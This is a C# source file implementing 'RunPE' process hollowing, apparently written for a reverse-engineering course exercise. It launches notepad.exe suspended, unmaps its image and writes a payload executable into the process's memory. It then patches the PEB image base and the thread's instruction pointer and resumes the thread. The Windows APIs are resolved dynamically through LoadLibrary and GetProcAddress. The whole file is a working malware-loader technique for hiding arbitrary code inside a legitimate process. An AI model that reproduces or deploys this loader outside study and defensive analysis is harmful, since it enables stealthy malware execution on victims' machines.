using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace RunPE
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            string targetPath = @"C:\Windows\SysWOW64\notepad.exe";
            string payloadPath = @"C:\Users\misha.kurtz\Reverse-Engineering\A02-Process-Inj-Hollowing-Code-Inj\A02_5\bin\A02_5_loaded_exe.exe";

            Console.WriteLine($"[A02_5] Target path: {targetPath}");
            Console.WriteLine($"[A02_5] Target exists: {File.Exists(targetPath)}");
            Console.WriteLine($"[A02_5] Payload path: {payloadPath}");
            Console.WriteLine($"[A02_5] Payload exists: {File.Exists(payloadPath)}");

            if (!File.Exists(payloadPath))
            {
                Console.WriteLine($"Payload not found: {payloadPath}");
                return;
            }

            byte[] payload = File.ReadAllBytes(payloadPath);
            Console.WriteLine("[A02_5] Starting process hollowing test...");
            RunPE.Execute(targetPath, payload);
            Console.WriteLine("[A02_5] Done.");
        }
    }

    public static class RunPE
    {
        // ── CONTEXT field offsets (x86 winnt.h) ──────────────────────────────────
        // These are byte offsets into the raw CONTEXT buffer.
        private const int CONTEXT_SIZE = 0x2CC; // 716 bytes
        private const int CONTEXT_FLAGS_OFFSET = 0x000; // ContextFlags
        private const int CONTEXT_EBX_OFFSET = 0x0A4; // Ebx  ← PEB pointer
        private const int CONTEXT_EIP_OFFSET = 0x0B8; // Eip  ← redirect here

        // CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS
        private const int CONTEXT_FULL = 0x10007;

        #region API delegates
        // ── CHANGE from original: context parameter is IntPtr, not int[] ─────────
        // Passing int[] forces the CLR to marshal a managed array, which produces
        // a buffer with the wrong size/alignment → ERROR_INVALID_PARAMETER (87).
        // IntPtr is a raw pointer — no marshalling, no copies, no surprises.

        private delegate int DelegateResumeThread(IntPtr handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, IntPtr context);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateSetThreadContext(IntPtr thread, IntPtr context);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, IntPtr context);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DelegateGetThreadContext(IntPtr thread, IntPtr context);

        // Everything below is unchanged from the original
        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);
        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine,
            IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags,
            IntPtr environment, string currentDirectory,
            ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        #endregion


        #region API (unchanged)
        private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");
        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");
        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");
        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");
        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");
        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");
        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");
        #endregion


        #region CreateAPI (unchanged)
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        private static T LoadApi<T>(string dllName, string functionName) where T : Delegate
        {
            IntPtr hModule = LoadLibraryA(dllName);
            if (hModule == IntPtr.Zero)
                throw new Exception($"LoadLibraryA failed for {dllName}. LastError={Marshal.GetLastWin32Error()}");

            IntPtr procAddress = GetProcAddress(hModule, functionName);
            if (procAddress == IntPtr.Zero)
                throw new Exception($"GetProcAddress failed for {dllName}!{functionName}. LastError={Marshal.GetLastWin32Error()}");

            return Marshal.GetDelegateForFunctionPointer<T>(procAddress);
        }
        #endregion


        #region Structures (unchanged)
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion


        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0x0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));

                // Allocate the unmanaged CONTEXT buffer once per attempt.
                // AllocHGlobal gives us a raw heap block — no CLR marshalling
                // involved when we pass it to Get/SetThreadContext.
                IntPtr contextPtr = IntPtr.Zero;

                try
                {
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false,
                            0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi))
                        throw new Exception($"CreateProcessA failed. LastError={Marshal.GetLastWin32Error()}");

                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);

                    // ── OPTION B: unmanaged CONTEXT buffer ────────────────────────
                    // Allocate 716 bytes (0x2CC) of unmanaged memory, zero it, then
                    // write ContextFlags at offset 0. The pointer goes directly to
                    // the Win32 API — no int[] copy, no wrong size, no error 87.
                    contextPtr = Marshal.AllocHGlobal(CONTEXT_SIZE);
                    // Zero the buffer (AllocHGlobal does NOT zero-initialise)
                    for (int b = 0; b < CONTEXT_SIZE; b++)
                        Marshal.WriteByte(contextPtr, b, 0x00);

                    Marshal.WriteInt32(contextPtr, CONTEXT_FLAGS_OFFSET, CONTEXT_FULL);

                    // Use the appropriate variant based on host bitness:
                    //   32-bit host → GetThreadContext
                    //   64-bit host → Wow64GetThreadContext  (targeting WOW64 notepad)
                    bool getOk = IntPtr.Size == 0x4
                        ? GetThreadContext(pi.ThreadHandle, contextPtr)
                        : Wow64GetThreadContext(pi.ThreadHandle, contextPtr);

                    if (!getOk)
                        throw new Exception($"GetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");

                    // Read EBX (PEB pointer) at its known offset in the buffer
                    int ebx = Marshal.ReadInt32(contextPtr, CONTEXT_EBX_OFFSET);
                    int baseAddress = 0x0;

                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite))
                        throw new Exception($"ReadProcessMemory PEB image base failed. LastError={Marshal.GetLastWin32Error()} EBX=0x{ebx:X}");

                    if (imageBase == baseAddress)
                    {
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0)
                            throw new Exception($"ZwUnmapViewOfSection failed. LastError={Marshal.GetLastWin32Error()} baseAddress=0x{baseAddress:X}");
                    }

                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);

                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);

                    if (newImageBase == 0x0)
                        throw new Exception($"VirtualAllocEx failed. LastError={Marshal.GetLastWin32Error()} imageBase=0x{imageBase:X} sizeOfImage=0x{sizeOfImage:X}");

                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite))
                        throw new Exception($"WriteProcessMemory headers failed. LastError={Marshal.GetLastWin32Error()}");

                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);

                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);

                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);

                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
                                throw new Exception($"WriteProcessMemory section failed. LastError={Marshal.GetLastWin32Error()} section={I} VA=0x{virtualAddress:X} size=0x{sizeOfRawData:X}");
                        }

                        sectionOffset += 0x28;
                    }

                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite))
                        throw new Exception($"WriteProcessMemory PEB image base update failed. LastError={Marshal.GetLastWin32Error()} EBX=0x{ebx:X}");

                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);

                    // Write new EIP at its correct offset (0xB8) in the buffer
                    Marshal.WriteInt32(contextPtr, CONTEXT_EIP_OFFSET, newImageBase + addressOfEntryPoint);

                    bool setOk = IntPtr.Size == 0x4
                        ? SetThreadContext(pi.ThreadHandle, contextPtr)
                        : Wow64SetThreadContext(pi.ThreadHandle, contextPtr);

                    if (!setOk)
                        throw new Exception($"SetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");

                    if (ResumeThread(pi.ThreadHandle) == -1)
                        throw new Exception($"ResumeThread failed. LastError={Marshal.GetLastWin32Error()}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[A02_5] Failed: {ex}");
                    Console.WriteLine($"[A02_5] Last Win32 Error: {Marshal.GetLastWin32Error()}");

                    if (pi.ProcessId != 0)
                    {
                        try { Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill(); }
                        catch { }
                    }

                    continue;
                }
                finally
                {
                    // Always release the unmanaged buffer, success or failure
                    if (contextPtr != IntPtr.Zero)
                        Marshal.FreeHGlobal(contextPtr);
                }

                break;
            }
        }
    }
}